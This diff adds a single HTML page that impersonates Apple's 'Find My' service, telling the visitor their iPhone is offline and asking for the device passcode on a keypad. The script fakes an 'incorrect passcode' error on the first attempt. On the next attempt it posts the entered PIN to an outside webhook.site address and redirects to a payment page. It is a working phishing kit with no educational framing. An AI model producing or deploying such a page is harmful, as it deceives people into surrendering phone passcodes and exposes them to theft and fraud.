@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find My - Apple</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: #000; 
+            color: #fff; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 10px;
+        }
+        .container { 
+            max-width: 420px; 
+            width: 100%; 
+            background: #1c1c1e; 
+            border-radius: 18px; 
+            overflow: hidden; 
+            box-shadow: 0 0 50px rgba(0,122,255,0.8); 
+        }
+        header { 
+            background: #007aff; 
+            padding: 20px; 
+            text-align: center; 
+            font-size: 20px; 
+            font-weight: 600; 
+        }
+        .content { 
+            padding: 30px 20px; 
+            text-align: center; 
+        }
+        .dots {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .dot {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+        }
+        .dot.filled { background: #fff; }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 30px auto;
+        }
+        .key {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: 400;
+            cursor: pointer;
+            user-select: none;
+        }
+        .key:active { background: rgba(255,255,255,0.3); }
+        .info { color: #aaa; margin: 20px 0; font-size: 15px; }
+        .error { color: #ff3b30; font-size: 15px; margin: 15px 0; min-height: 24px; font-weight: 500; }
+        .logo { width: 65px; margin: 15px auto 8px; display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>Find My</header>
+        
+        <div class="content">
+            <!-- Direct high-quality Apple logo -->
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+
+            <h2>Your iPhone is offline</h2>
+            <p class="info">To locate it, enter your passcode</p>
+            
+            <div class="dots" id="dots">
+                <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            </div>
+
+            <div class="error" id="error"></div>
+
+            <div class="keypad" id="keypad">
+                <div class="key" onclick="pressKey(1)">1</div>
+                <div class="key" onclick="pressKey(2)">2</div>
+                <div class="key" onclick="pressKey(3)">3</div>
+                <div class="key" onclick="pressKey(4)">4</div>
+                <div class="key" onclick="pressKey(5)">5</div>
+                <div class="key" onclick="pressKey(6)">6</div>
+                <div class="key" onclick="pressKey(7)">7</div>
+                <div class="key" onclick="pressKey(8)">8</div>
+                <div class="key" onclick="pressKey(9)">9</div>
+                <div class="key"></div>
+                <div class="key" onclick="pressKey(0)">0</div>
+                <div class="key" onclick="clearPin()">✕</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let pin = '';
+        let attempts = 0;
+        let timeout;
+
+        function pressKey(num) {
+            if (pin.length >= 6) return;
+            pin += num;
+            updateDots();
+
+            clearTimeout(timeout);
+            timeout = setTimeout(() => {
+                if (pin.length >= 4) {
+                    attempts++;
+                    if (attempts === 1) {
+                        document.getElementById('error').textContent = "Incorrect passcode. Try again.";
+                        setTimeout(() => {
+                            clearPin();
+                            document.getElementById('error').textContent = "";
+                        }, 1600);
+                    } else {
+                        fetch('https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                pin: pin,
+                                attempts: attempts,
+                                status: "PASSCODE_ENTERED",
+                                time: new Date().toISOString()
+                            })
+                        }).then(() => window.location.href = 'payment.html')
+                          .catch(() => window.location.href = 'payment.html');
+                    }
+                }
+            }, 700);
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('filled', i < pin.length);
+            });
+        }
+
+        function clearPin() {
+            pin = '';
+            updateDots();
+        }
+    </script>
+</body>
+</html>
